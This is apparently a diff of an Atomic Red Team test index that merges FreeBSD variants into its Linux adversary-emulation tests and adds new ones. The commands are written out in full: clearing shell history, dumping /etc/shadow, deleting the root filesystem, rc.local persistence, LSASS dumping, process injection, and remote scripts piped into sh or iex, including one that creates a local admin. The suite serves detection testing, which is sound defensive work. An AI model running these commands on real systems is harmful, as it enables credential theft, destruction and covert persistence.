@@ -260,45 +260,53 @@ input_arguments.driver_inf.default: C:\Windows\INF\usbstor.inf
 
 "
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (rm),a934276e-2be5-4a36-93fd-98adbb5bd4fc,"Clears bash history via rm
-",linux,macos,,"rm ~/.bash_history
-",sh,,,,,,
-T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (rm),448893f8-1d5d-4ae2-9017-7fcd73a7e100,"Clears sh history via rm
-",linux,,,"rm ~/.sh_history
-",sh,,,,,,
+",linux,macos,,"rm #{history_path}
+",sh,,,,,,"input_arguments.history_path.description: Bash history path
+
+input_arguments.history_path.type: path
+
+input_arguments.history_path.default: ~/.bash_history
+
+"
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (echo),cbf506a5-dd78-43e5-be7e-a46b7c7a0a11,"Clears bash history via echo
-",linux,,,"echo """" > ~/.bash_history
-",sh,,,,,,
-T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (echo),a4d63cb3-9ed9-4837-9480-5bf6b09a6c96,"Clears sh history via echo
-",linux,,,"echo """" > ~/.sh_history
-",sh,,,,,,
+",linux,,,"echo """" > #{history_path}
+",sh,,,,,,"input_arguments.history_path.description: Bash history path
+
+input_arguments.history_path.type: path
+
+input_arguments.history_path.default: ~/.bash_history
+
+"
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (cat dev/null),b1251c35-dcd3-4ea1-86da-36d27b54f31f,"Clears bash history via cat /dev/null
-",linux,macos,,"cat /dev/null > ~/.bash_history
-",sh,,,,,,
-T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (cat dev/null),ecaefd53-6fa4-4781-ba51-d9d6fb94dbdc,"Clears sh history via cat /dev/null
-",linux,,,"cat /dev/null > ~/.sh_history
-",sh,,,,,,
+",linux,macos,,"cat /dev/null > #{history_path}
+",sh,,,,,,"input_arguments.history_path.description: Bash history path
+
+input_arguments.history_path.type: path
+
+input_arguments.history_path.default: ~/.bash_history
+
+"
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (ln dev/null),23d348f3-cc5c-4ba9-bd0a-ae09069f0914,"Clears bash history via a symlink to /dev/null
-",linux,macos,,"ln -sf /dev/null ~/.bash_history
-",sh,,,,,,
-T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (ln dev/null),3126aa7a-8768-456f-ae05-6ab2d4accfdd,"Clears sh history via a symlink to /dev/null
-",linux,,,"ln -sf /dev/null ~/.sh_history
-",sh,,,,,,
+",linux,macos,,"ln -sf /dev/null #{history_path}
+",sh,,,,,,"input_arguments.history_path.description: Bash history path
+
+input_arguments.history_path.type: path
+
+input_arguments.history_path.default: ~/.bash_history
+
+"
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (truncate),47966a1d-df4f-4078-af65-db6d9aa20739,"Clears bash history via truncate
-",linux,,,"truncate -s0 ~/.bash_history
-",sh,,,,,,
-T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (truncate),e14d9bb0-c853-4503-aa89-739d5c0a5818,"Clears sh history via truncate
-",linux,,,"truncate -s0 ~/.sh_history
-",sh,,,,,,
+",linux,,,"truncate -s0 #{history_path}
+",sh,,,,,,"input_arguments.history_path.description: Bash history path
+
+input_arguments.history_path.type: path
+
+input_arguments.history_path.default: ~/.bash_history
+
+"
 T1070.003,Indicator Removal on Host: Clear Command History,Clear history of a bunch of shells,7e6721df-5f08-4370-9255-f06d8a77af4c,"Clears the history of a bunch of different shell types by setting the history size to zero
 ",linux,macos,,"unset HISTFILE
 export HISTFILESIZE=0
-history -c
-",sh,,,,,,
-T1070.003,Indicator Removal on Host: Clear Command History,Clear history of a bunch of shells (freebsd),9bf7c8af-5e12-42ea-bf6b-b0348fb9dfb0,"Clears the history of a bunch of different shell types by setting the history size to zero
-",linux,,,"unset HISTFILE
-unset histfile
-export HISTFILESIZE=0
-export HISTSIZE=0
 history -c
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear and Disable Bash History Logging,784e4011-bd1a-4ecd-a63a-8feb278512e6,"Clears the history and disable bash history logging of the current shell and future shell sessions
@@ -316,26 +324,14 @@ whoami
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Disable Bash History Logging with SSH -T,5f8abd62-f615-43c5-b6be-f780f25790a1,"Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog
 ",linux,,,"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
-",sh,,,"userdel -f testuser1
+",sh,,,"[ ""$(uname)"" = 'FreeBSD' ] && rmuser -y testuser1 || userdel -f testuser1
 ",,"dependencies.0.description: Install sshpass and create user account used for excuting
 
 dependencies.0.prereq_command: $(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)
 
-dependencies.0.get_prereq_command: /usr/sbin/useradd testuser1
-echo -e 'pwd101!\npwd101!' | passwd testuser1
-(which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)
-
-",
-T1070.003,Indicator Removal on Host: Clear Command History,Disable sh History Logging with SSH -T (freebsd),ec3f2306-dd19-4c4b-bed7-92d20e9b1dee,"Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog
-",linux,,,"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
-",sh,,,"rmuser -y testuser1
-",,"dependencies.0.description: Install sshpass and create user account used for excuting
-
-dependencies.0.prereq_command: $(getent passwd testuser1 >/dev/null) && $(which sshpass >/dev/null)
-
-dependencies.0.get_prereq_command: pw useradd testuser1 -g wheel -s /bin/sh
-echo 'pwd101!' | pw mod user testuser1 -h 0
-(which pkg && pkg install -y sshpass)
+dependencies.0.get_prereq_command: [ ""$(uname)"" = 'FreeBSD' ] && pw useradd testuser1 -g wheel -s /bin/sh || /usr/sbin/useradd testuser1
+[ ""$(uname)"" = 'FreeBSD' ] && echo 'pwd101!' | pw mod user testuser1 -h 0 || echo -e 'pwd101!\npwd101!' | passwd testuser1
+(which yum && yum -y install epel-release sshpass)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass)||(which pkg && pkg install -y sshpass)
 
 ",
 T1070.003,Indicator Removal on Host: Clear Command History,Prevent Powershell History Logging,2f898b81-3e97-4abb-bc3f-a95138988370,"Prevents Powershell history
@@ -537,35 +533,15 @@ Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task
 T1053.002,Scheduled Task/Job: At,At - Schedule a job,7266d898-ac82-4ec0-97c7-436075d0d08e,"This test submits a command to be run in the future by the `at` daemon.
 ",linux,,,"echo ""#{at_command}"" | at #{time_spec}",sh,False,,,sh,"dependencies.0.description: The `at` and `atd` executables must exist in the PATH
 
-dependencies.0.prereq_command: which at && which atd
+dependencies.0.prereq_command: if [ ""$(uname)"" = 'FreeBSD' ]; then which at; else which at && which atd; fi;
 
 dependencies.0.get_prereq_command: echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'
 
 dependencies.1.description: The `atd` daemon must be running
 
-dependencies.1.prereq_command: systemctl status atd || service atd status
+dependencies.1.prereq_command: if [ $(uname) = 'Linux' ]; then systemctl status atd || service atd status; fi;
 
 dependencies.1.get_prereq_command: echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'
-
-","input_arguments.time_spec.description: Time specification of when the command should run
-
-input_arguments.time_spec.type: string
-
-input_arguments.time_spec.default: now + 1 minute
-
-input_arguments.at_command.description: The command to be run
-
-input_arguments.at_command.type: string
-
-input_arguments.at_command.default: echo Hello from Atomic Red Team
-
-"
-T1053.002,Scheduled Task/Job: At,At - Schedule a job freebsd,549863fb-1c91-467e-97fc-1fa32b9f356b,"This test submits a command to be run in the future by the `at` daemon.
-",linux,,,"echo ""#{at_command}"" | at #{time_spec}",sh,False,,,sh,"dependencies.0.description: The `at` executable must exist in the PATH
-
-dependencies.0.prereq_command: which at
-
-dependencies.0.get_prereq_command: echo 'Please install `at` ; they were not found in the PATH (Package name: `at`)'
 
 ","input_arguments.time_spec.description: Time specification of when the command should run
 
@@ -895,7 +871,8 @@ input_arguments.output_file.default: /tmp/T1003.008.txt
 
 "
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow","Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",df1a55ae-019d-4120-bc35-94f4bc5c4b0a,"Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed
-",linux,,,"echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}
+",linux,,,"unamestr=$(uname)
+if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > ${output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > ${output_file}; fi
 ",sh,True,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
 
@@ -906,8 +883,8 @@ input_arguments.output_file.default: /tmp/T1003.008.txt
 "
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow","Access /etc/{shadow,passwd,master.passwd} with shell builtins",f5aa6543-6cb2-4fae-b9c2-b96e14721713,"Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins
 ",linux,,,"testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
+[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
 testcat /etc/passwd
-testcat /etc/master.passwd
 testcat /etc/shadow
 ",sh,True,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
@@ -3107,11 +3084,7 @@ input_arguments.folder_to_delete.default: $env:TEMP\deleteme_folder_T1551.004
 
 "
 T1070.004,Indicator Removal on Host: File Deletion,Delete Filesystem - Linux,f3aa95fe-4f10-4485-ad26-abf22a764c52,"This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
-",linux,,,"rm -rf / --no-preserve-root > /dev/null 2> /dev/null
-",bash,,,,,,
-T1070.004,Indicator Removal on Host: File Deletion,Delete Filesystem - FreeBSD,b5aaca7e-a48f-4f1b-8f0f-a27b8f516608,"This test deletes the entire root filesystem of a FreeBSD system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
-",linux,,,"chflags -R 0 /
-rm -rf / > /dev/null 2> /dev/null
+",linux,,,"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
 ",sh,,,,,,
 T1070.004,Indicator Removal on Host: File Deletion,Delete Prefetch File,36f96049-0ad7-4a5f-8418-460acaeb92fb,"Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run ""(Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" | Measure-Object).Count""
 before and after the test to verify that the number of prefetch files decreases by 1.
@@ -7763,6 +7736,22 @@ input_arguments.msi_exe.type: path
 input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe
 
 "
+T1055.015,Process Injection: ListPlanting,Process injection ListPlanting,4f3c7502-b111-4dfe-8a6e-529307891a59,"This test injects shellcode into a remote RegEdit process using the ListPlanting technique. ListPlanting exploits Window with ListView control. Code write to memory with NtWriteVirtualMemory. The shellcode is executed via PostMessage. When successful, a message box will appear with the title ""Warning"" and the content ""Atomic Red Team"" after a few seconds. Notepad will open following the appearance of the message box.",windows,,,"Start-Process ""#{exe_binary}""
+Start-Sleep -Seconds 7
+Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",powershell,True,,Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force,powershell,"dependencies.0.description: Injector ListPlanting.exe must exist at specified location (#{exe_binary})
+
+dependencies.0.prereq_command: if (Test-Path ""#{exe_binary}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{exe_binary}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe"" -OutFile ""#{exe_binary}""
+
+","input_arguments.exe_binary.description: PE binary
+
+input_arguments.exe_binary.type: path
+
+input_arguments.exe_binary.default: PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe
+
+"
 T1014,Rootkit,Loadable Kernel Module based Rootkit,dfb50072-e45a-4c75-a17e-a484809c8553,"Loadable Kernel Module based Rootkit
 ",linux,,,"sudo insmod #{rootkit_path}/#{rootkit_name}.ko
 ",sh,True,,"sudo rmmod #{rootkit_name}
@@ -8018,21 +8007,13 @@ input_arguments.output_file.default: $env:TEMP\discovery.bat
 
 "
 T1074.001,Data Staged: Local Data Staging,Stage data from Discovery.sh,39ce0303-ae16-4b9e-bb5b-4f53e8262066,"Utilize curl to download discovery.sh and execute a basic information gathering shell script
-",linux,macos,,"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}
-",bash,,,,,,"input_arguments.output_file.description: Location to save downloaded discovery.bat file
+",linux,macos,,"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
+",sh,,,"rm #{output_file}
+",sh,"dependencies.0.description: Check if curl is installed on the machine.
 
-input_arguments.output_file.type: path
+dependencies.0.prereq_command: if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
 
-input_arguments.output_file.default: /tmp/T1074.001_discovery.log
-
-"
-T1074.001,Data Staged: Local Data Staging,Stage data from Discovery.sh (freebsd),4fca7b49-379d-4493-8890-d6297750fa46,"Utilize curl to download discovery.sh and execute a basic information gathering shell script
-",linux,,,"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
-",sh,,,,sh,"dependencies.0.description: Check if curl is installed.
-
-dependencies.0.prereq_command: if [ ! -x ""$(command -v curl)"" ]; then exit 1; else exit 0; fi;
-
-dependencies.0.get_prereq_command: (which pkg && pkg install -y curl)
+dependencies.0.get_prereq_command: which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
 
 ","input_arguments.output_file.description: Location to save downloaded discovery.bat file
 
@@ -8238,6 +8219,29 @@ dependencies.1.get_prereq_command: New-Item -Path ""#{file_path}\kxwn.lock"" -It
 input_arguments.file_path.type: string
 
 input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads
+
+"
+T1070.006,Indicator Removal on Host: Timestomp,MacOS - Timestomp Date Modified,87fffff4-d371-4057-a539-e3b24c37e564,"Stomps on the modification timestamp of a file using MacOS's SetFile utility
+",macos,,,"SetFile -m #{target_date} #{target_filename}
+",sh,,,"rm -f #{target_filename}
+",,"dependencies.0.description: The file must exist in order to be timestomped
+
+dependencies.0.prereq_command: test -e #{target_filename} && exit 0 || exit 1
+
+dependencies.0.get_prereq_command: echo 'T1070.006 MacOS file modified timestomp test' > #{target_filename}
+
+","input_arguments.target_filename.description: Path of file that we are going to stomp on last modified time
+
+
+input_arguments.target_filename.type: path
+
+input_arguments.target_filename.default: /tmp/T1070.006-modified.txt
+
+input_arguments.target_date.description: Date to replace original timestamps with
+
+input_arguments.target_date.type: string
+
+input_arguments.target_date.default: 01/01/1970
 
 "
 T1546.012,Event Triggered Execution: Image File Execution Options Injection,IFEO Add Debugger,fdda2626-5234-4c90-b163-60849a24c0b8,"Leverage Global Flags Settings
@@ -8562,15 +8566,15 @@ input_arguments.TorExe.type: string
 input_arguments.TorExe.default: PathToAtomicsFolder\..\ExternalPayloads\tor\Tor\tor.exe
 
 "
-T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - Debian/Ubuntu,5ff9d047-6e9c-4357-b39b-5cf89d9b59c7,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
+T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - Debian/Ubuntu/FreeBSD,5ff9d047-6e9c-4357-b39b-5cf89d9b59c7,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
 Upon successful execution, the tor proxy service will be launched. 
-",linux,,,"sudo systemctl start tor 
-",sh,True,,"sudo systemctl stop tor
+",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor
+",sh,True,,"[ ""$(uname)"" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor
 ",sh,"dependencies.0.description: Tor must be installed on the machine 
 
 dependencies.0.prereq_command: if [ -x ""$(command -v tor --version)"" ]; then exit 0; else exit 1; fi
 
-dependencies.0.get_prereq_command: sudo apt-get -y install tor
+dependencies.0.get_prereq_command: (which apt && sudo apt-get -y install tor) || (which pkg && pkg install -y tor)
 
 ",
 T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - MacOS,12631354-fdbc-4164-92be-402527e748da,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
@@ -8583,19 +8587,6 @@ dependencies.0.prereq_command: if [ -x ""$(command -v tor --version)"" ]; then e
 
 dependencies.0.get_prereq_command: if [ ! -x ""$(command -v brew --version)"" ]; then /bin/bash -c ""$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)""; fi
 brew install tor
-
-",
-T1090.003,Proxy: Multi-hop Proxy,Tor Proxy Usage - FreeBSD,550ec67d-a99e-408b-816a-689271b27d2a,"This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.
-Upon successful execution, the tor proxy service will be launched. 
-",linux,,,"sysrc tor_enable=""YES""
-service tor start
-",sh,True,,"service tor stop
-sysrc -x tor_enable
-",sh,"dependencies.0.description: Tor must be installed on the machine 
-
-dependencies.0.prereq_command: if [ -x ""$(command -v tor --version)"" ]; then exit 0; else exit 1; fi
-
-dependencies.0.get_prereq_command: pkg install -y tor
 
 ",
 T1115,Clipboard Data,Utilize Clipboard to store or execute commands from,0cd14633-58d4-4422-9ede-daa2c9474ae7,"Add data to clipboard to copy off or execute commands from.
@@ -17141,17 +17132,9 @@ sudo chmod +x /etc/rc.common
 ",,,
 T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.local,126f71af-e1c9-405c-94ef-26a47b16c102,"Modify rc.local
 ",linux,,,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
-printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
-echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local
-printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
-sudo chmod +x /etc/rc.local
-",bash,True,,"origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
-",,,
-T1037.004,Boot or Logon Initialization Scripts: Rc.common,rc.local (FreeBSD),2015fb48-8ab6-4fbf-928b-0b62de5c9476,"Modify rc.local
-",linux,,,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
-printf '%s\n' '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local
-echo 'python3.9 -c ""import os, base64;exec(base64.b64decode(\""aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo=\""))""' | sudo tee -a /etc/rc.local
-printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
+[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local
+echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local
+printf 'exit 0' | sudo tee -a /etc/rc.local
 sudo chmod +x /etc/rc.local
 ",sh,True,,"origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
 ",,,
@@ -17195,12 +17178,12 @@ Upon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. 
 ",windows,,,"netsh advfirewall firewall show rule name=all
 ",command_prompt,,,,,,
 T1016,System Network Configuration Discovery,System Network Configuration Discovery,c141bbdb-7fca-4254-9fd6-f47e79447e17,"Identify network configuration information.
-
 Upon successful execution, sh will spawn multiple commands and output will be via stdout.
-",macos,linux,,"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
+",macos,linux,,"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""netstat -Sp tcp""; else cmd=""netstat -ant""; fi;
+if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi;
-if [ -x ""$(command -v netstat)"" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;
 ",sh,,,,sh,"dependencies.0.description: Check if arp command exists on the machine
 
 dependencies.0.prereq_command: if [ -x ""$(command -v arp)"" ]; then exit 0; else exit 1; fi;
@@ -17208,13 +17191,6 @@ dependencies.0.prereq_command: if [ -x ""$(command -v arp)"" ]; then exit 0; els
 dependencies.0.get_prereq_command: (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
 
 ",
-T1016,System Network Configuration Discovery,System Network Configuration Discovery (freebsd),7625b978-4efd-47de-8744-add270374bee,"Identify network configuration information.
-
-Upon successful execution, sh will spawn multiple commands and output will be via stdout.
-",linux,,,"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
-if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;
-if [ -x ""$(command -v netstat)"" ]; then netstat -Sp tcp | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;
-",sh,,,,,,
 T1016,System Network Configuration Discovery,System Network Configuration Discovery (TrickBot Style),dafaf052-5508-402d-bf77-51e0700c02e2,"Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/
 
 Upon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.
@@ -17676,6 +17652,8 @@ input_arguments.password.type: string
 input_arguments.password.default: T1136_pass
 
 "
+T1136.001,Create Account: Local Account,Create a new Windows admin user via .NET,2170d9b5-bacd-4819-a952-da76dae0815f,"Creates a new admin user in a powershell session without using net.exe
+",windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),powershell,True,,,,,
 T1654,Log Enumeration,Get-EventLog To Enumerate Windows Security Log,a9030b20-dd4b-4405-875e-3462c6078fdc,"Uses the built-in PowerShell commandlet Get-EventLog to search for 'SYSTEM' keyword and saves results to a text file.
 
 This technique was observed in a [TheDFIRReport case](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/) 
@@ -17770,7 +17748,8 @@ T1027,Obfuscated Files or Information,Decode base64 Data into Script,f45df6be-2e
 
 Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
 and uname -v
-",macos,linux,,"cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
+",macos,linux,,"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;
+cat /tmp/encoded.dat | $cmd > /tmp/art.sh
 chmod +x /tmp/art.sh
 /tmp/art.sh
 ",sh,,,"rm /tmp/encoded.dat 
@@ -17779,29 +17758,8 @@ rm /tmp/art.sh
 
 dependencies.0.prereq_command: if [ -e ""/tmp/encoded.dat"" ]; then exit 0; else exit 1; fi
 
-dependencies.0.get_prereq_command: echo ""#{shell_command}"" | base64 > /tmp/encoded.dat
-
-","input_arguments.shell_command.description: command to encode
-
-input_arguments.shell_command.type: string
-
-input_arguments.shell_command.default: echo Hello from the Atomic Red Team && uname -v
-
-"
-T1027,Obfuscated Files or Information,Decode base64 Data into Script,197ed693-08e6-4958-bfd8-5974e291be6c,"Creates a base64-encoded data file and decodes it into an executable shell script
-
-Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
-and uname -v
-",linux,,,"cat /tmp/encoded.dat | b64decode -r > /tmp/art.sh
-chmod +x /tmp/art.sh
-/tmp/art.sh
-",sh,,,"rm /tmp/encoded.dat 
-rm /tmp/art.sh
-",sh,"dependencies.0.description: encode the command into base64 file
-
-dependencies.0.prereq_command: exit 1
-
-dependencies.0.get_prereq_command: echo ""#{shell_command}"" | b64encode -r - > /tmp/encoded.dat
+dependencies.0.get_prereq_command: if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64encode -r -""; else cmd=""base64""; fi;
+echo ""#{shell_command}"" | $cmd > /tmp/encoded.dat
 
 ","input_arguments.shell_command.description: command to encode
 
@@ -18193,7 +18151,7 @@ T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using NanoDu
 https://github.com/helpsystems/nanodump
 
 Upon successful execution, you should find the nanondump.dmp file in the temp directory
-",windows,,,"%temp%\nanodump.x64.exe -w ""%temp%\nanodump.dmp""
+",windows,,,"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp""
 ",command_prompt,True,,"del ""%temp%\nanodump.dmp"" >nul 2> nul
 ",powershell,"dependencies.0.description: NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
 
@@ -18201,7 +18159,7 @@ dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayl
 
 dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
-Invoke-WebRequest ""https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe""
+Invoke-WebRequest ""https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"" 
 
 ",
 T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using Windows Task Manager,dea6c349-f1c6-44f3-87a1-1ed33a59a607,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
@@ -18393,6 +18351,35 @@ write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /ful
 Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""
 ",powershell,True,,"Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
 ",,,
+T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory through Silent Process Exit,eb5adf16-b601-4926-bca7-dad22adffb37,"WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a 
+memory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism 
+introduced in Windows 7 called Silent Process Exit, which provides the ability to trigger
+specific actions for a monitored process in one of two scenarios; either the process terminates
+itself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. 
+The major advantage of this technique is that it does not cause lsass.exe to crash, and since 
+WerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides 
+the added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, 
+from an attacker standpoint this is appealing as their illicit credential extraction will 
